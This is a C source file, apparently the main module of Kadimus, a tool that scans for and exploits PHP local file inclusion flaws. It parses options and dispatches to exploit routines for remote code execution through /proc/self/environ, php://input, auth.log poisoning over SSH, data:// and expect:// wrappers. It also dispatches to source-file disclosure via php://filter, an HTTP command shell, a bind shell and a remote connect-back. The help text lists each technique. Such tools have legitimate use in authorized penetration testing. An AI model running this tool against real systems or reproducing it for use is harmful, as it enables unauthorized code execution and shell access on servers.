#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <curl/curl.h>

#include "kadimus.h"

#include "memory/alloc.h"
#include "regex/pcre.h"
#include "net/utils.h"
#include "io/utils.h"
#include "globals.h"
#include "output.h"

#include "scan/scan.h"
#include "techniques/rce.h"
#include "techniques/php-filter.h"
#include "fun/exec-php-code.h"
#include "fun/http-shell.h"
#include "fun/exec-cmd.h"
#include "string/optparser.h"

static void check_opts(struct kadimus_opts *opts)
{
	if (!opts->url)
		die("kadimus: try 'kadimus -h' or 'kadimus --help' to display help\n");

	if (opts->get_source) {
		if (!opts->url)
			die("error: -S, --source requires -u\n");

		if (!opts->remote_filename)
			die("error: -S, --source requires -f\n");

		if (!opts->parameter)
			die("error: -S, --source requires --parameter\n");
	}

	if (opts->shell) {
		if (!opts->url)
			die("error: -s, --shell requires -u\n");

		if (!opts->technique)
			die("error: -s, --shell requires -T\n");
	}

	if (opts->listen && !opts->port) {
		die("error: -l, --listen requires -p\n");
	}

	if (opts->connect && !opts->port) {
		die("error: --connect requires -p\n");
	}

	if (opts->phpcode) {
		if (!opts->url)
			die("error: -C, --code requires -u\n");

		if (!opts->technique)
			die("error: -C, --code requires -T\n");
	}

	if (opts->cmd) {
		if (!opts->url)
			die("error: -c, --cmd requires -u\n");

		if (!opts->technique)
			die("error: -c, --cmd requires -T\n");
	}

	if (opts->technique == datawrap_tech && !opts->parameter) {
		die("error: -T data requires --parameter\n");
	}

	if (opts->technique == auth_log_tech && !opts->ssh_target) {
		die("error: -T auth requires --ssh-target\n");
	}

	if (!opts->get_source && !opts->shell && !opts->cmd && !opts->phpcode) {
		opts->scan = 1;
		opts->technique = 0;
	}

	if (opts->proxy && regex_match("^.+:\\/\\/.+\\:(\\d+)$", opts->proxy, 0, 0))
		die("--proxy error: invalid syntax\n");

	if (opts->connect && checkhostname(opts->connect))
		die("--connect error: invalid IP/hostname\n");

	if (opts->ssh_target && checkhostname(opts->ssh_target)) {
		die("--ssh-target error: invalid IP/hostname\n");
	}

	// check url
	if (!regex_match("^(https?://)?.+/.*\\?.+$", opts->url, 0, 0)) {
		die("-u, --url error: invalid syntax\n");
	}

	if (opts->phpcode && !regex_match("^\\s*?\\<\\?.+\\?\\>\\s*?$", opts->phpcode, 0, PCRE_DOTALL)) {
		die("error: -C, --code parameter must contain php brackets\n");
	}
}

static void setoutput(void *out, const char *filename)
{
	FILE **fh = (FILE **) out;
	*fh = xfopen(filename, "a");
	setlinebuf(*fh);
}

static void check_technique(void *out, const char *tech)
{
	struct {
		char *name;
		int value;
	} sp[] = {
		{"environ", proc_environ_tech},
		{"auth", auth_log_tech},
		{"input", php_input_tech},
		{"data", datawrap_tech},
		{"expect", expect_tech},
		{NULL, 0}
	};

	for (int i = 0; sp[i].name; i++) {
		if (!strcmp(tech, sp[i].name)) {
			*(int *) out = sp[i].value;
			return;
		}
	}

	die("-T, --technique: invalid format\n");
}

void parser_opts(int argc, char **argv, struct kadimus_opts *opts)
{
	memset(opts, 0x0, sizeof(struct kadimus_opts));
	global.timeout = 10;
	global.retry = 5;

	optparser_t options[] = {
		{"help", NULL, help, optnoarg, 'h'},
		{"cookie", &(global.cookies), NULL, optstring, 'B'},
		{"user-agent", &(global.useragent), NULL, optstring, 'A'},
		{"connect-timeout", &(global.timeout), NULL, optlong, 0},
		{"retry", &(global.retry), NULL, optint, 0},
		{"proxy", &(global.proxy), NULL, optstring, 0},

		{"url", &(opts->url), NULL, optstring, 'u'},
		{"output", &(output), setoutput, optcustom, 'o'},

		{"parameter", &(opts->parameter), NULL, optstring, 0},

		{"technique", &(opts->technique), check_technique, optcustom, 'T'},
		{"code", &(opts->phpcode), NULL, optstring, 'C'},
		{"cmd", &(opts->cmd), NULL, optstring, 'c'},
		{"shell", &(opts->shell), NULL, optbool, 's'},

		{"connect", &(opts->connect), NULL, optstring, 0},
		{"port", &(opts->port), NULL, optint, 'p'},
		{"listen", &(opts->listen), NULL, optbool, 'l'},

		{"ssh-port", &(opts->ssh_port), NULL, optint, 0},
		{"ssh-target", &(opts->ssh_target), NULL, optstring, 0},

		{"source", &(opts->get_source), NULL, optbool, 'S'},
		{"filename", &(opts->remote_filename), NULL, optstring, 'f'},
		{NULL, &(opts->source_output), setoutput, optcustom, 'O'}
	};

	optparser(argc, argv, options, sizeof(options) / sizeof(optparser_t));
	check_opts(opts);
}

void banner(void)
{
	static const char banner_msg[]=
		" _  __         _ _                     \n"
		"| |/ /__ _  __| (_)_ __ ___  _   _ ___ \n"
		"| ' // _` |/ _` | | '_ ` _ \\| | | / __|\n"
		"| . \\ (_| | (_| | | | | | | | |_| \\__ \\\n"
		"|_|\\_\\__,_|\\__,_|_|_| |_| |_|\\__,_|___/\n"
		"\n"
		"  v" VERSION " - LFI Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)\n";

	puts(banner_msg);
}

void help(void *no, const char *thing)
{
	(void) no;
	(void) thing;

	static const char help_msg[]=
		"Options:\n"
		"  -h, --help                    Display this help menu\n\n"

		"  Request:\n"
		"    -B, --cookie STRING         Set custom HTTP cookie header\n"
		"    -A, --user-agent STRING     User-Agent to send to server\n"
		"    --connect-timeout SECONDS   Maximum time allowed for connection\n"
		"    --retry NUMBER              Number of times to retry if connection fails\n"
		"    --proxy STRING              Proxy to connect (syntax: protocol://hostname:port)\n\n"

		"  Scanner:\n"
		"    -u, --url STRING            URL to scan/exploit\n"
		"    -o, --output FILE           File to save output results\n"
		"\n"
		"  Explotation:\n"
		"    --parameter STRING          Parameter name to inject exploit\n"
		"                                (only needed by RCE data and source disclosure)\n\n"

		"  RCE:\n"
		"    -T, --technique=TECH        LFI to RCE technique to use\n"
		"    -C, --code STRING           Custom PHP code to execute, with php brackets\n"
		"    -c, --cmd STRING            Execute system command on vulnerable target system\n"
		"    -s, --shell                 Simple command shell interface through HTTP Request\n\n"

		"    --connect STRING            IP/hostname to connect to\n"
		"    -p, --port NUMBER           Port number to connect to or listen on\n"
		"    -l, --listen                Bind and listen for incoming connections\n\n"

		"    --ssh-port NUMBER           Set the SSH port to try command injection (default: 22)\n"
		"    --ssh-target STRING         Set the SSH host\n\n"

		"    RCE Available techniques\n\n"

		"      environ                   Try to run PHP code using /proc/self/environ\n"
		"      input                     Try to run PHP code using php://input\n"
		"      auth                      Try to run PHP code using /var/log/auth.log\n"
		"      data                      Try to run PHP code using data://text\n"
		"      expect                    Try to run a command using expect://cmd\n"
		"\n"
		"    Source Disclosure:\n"
		"      -S, --source              Try to get the source file using filter://\n"
		"      -f, --filename STRING     Set filename to grab source [REQUIRED]\n"
		"      -O FILE                   Set output file (default: stdout)\n";

	puts(help_msg);
	exit(EXIT_SUCCESS);
}

void init_global_structs(void)
{
	curl_global_init(CURL_GLOBAL_ALL);
	srand(time(NULL));
}

int kadimus(struct kadimus_opts *opts)
{
	pid_t pid;

	if (opts->scan && opts->url)
		kadimus_scan(opts->url);

	if (opts->get_source)
		phpfilter_dumpfile(opts->source_output, opts->url,
			opts->remote_filename, opts->parameter);

	if (opts->technique == auth_log_tech)
		prepare_auth_log_rce(opts->url, opts->ssh_target, opts->ssh_port);

	if (opts->shell)
		rce_http_shell(opts->url, opts->parameter, opts->technique);

	if (opts->listen) {
		pid = fork();
		if (pid == 0) {
			bindshell(opts->port);
			exit(0);
		} else if (pid == -1) {
			xdie("fork() failed\n");
		}
	}

	if (opts->phpcode)
		exec_code(opts->url, opts->parameter, opts->phpcode, opts->technique);

	if (opts->cmd) {
		xinfo("trying exec code...\n");
		char *rce = exec_cmd(opts->url, opts->parameter, opts->cmd, opts->technique);

		xinfo("result:\n");
		if (rce) {
			printf("%s\n", rce);
			free(rce);
		} else {
			xerror("nothing to show!\n");
		}
	}

	if (opts->connect)
		remote_connect(opts->proxy, opts->connect, opts->port);

	if (opts->listen)
		wait(NULL);

	if (opts->output)
		fclose(opts->output);

	return 0;
}

int main(int argc, char **argv)
{
	setbuf(stdout, NULL);

	banner();

	struct kadimus_opts options;
	parser_opts(argc, argv, &options);

	init_global_structs();

	/* start */
	return kadimus(&options);
}
